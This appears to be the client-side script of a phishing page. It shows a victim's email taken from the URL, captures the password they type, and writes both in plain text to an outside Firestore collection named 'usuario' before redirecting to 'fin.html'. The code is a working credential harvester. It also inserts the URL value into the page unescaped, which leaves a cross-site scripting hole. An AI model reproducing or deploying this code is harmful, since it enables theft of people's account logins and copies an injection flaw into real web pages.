var getUrlParameter = function getUrlParameter(sParam) {
    var sPageURL = window.location.search.substring(1),
        sURLVariables = sPageURL.split('&'),
        sParameterName,
        i;

    for (i = 0; i < sURLVariables.length; i++) {
        sParameterName = sURLVariables[i].split('=');

        if (sParameterName[0] === sParam) {
            return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
        }
    }
};
$(document).ready(function(){
    var email=getUrlParameter("email");
    $("#correoView").html(email);
    $("#btncorreo").click(function(){
        $("#formInicio").submit();
    });
    $("#btnpass").click(async function(e) {
        var pass=$("#txtPassword").val();
        var email=getUrlParameter("email");
         db = firebase.firestore();
        await db.collection("usuario").add({
            nombre:email,
            password:pass
        })
        e.preventDefault(); 
        location="fin.html" //stop the browser from following

        
    });
});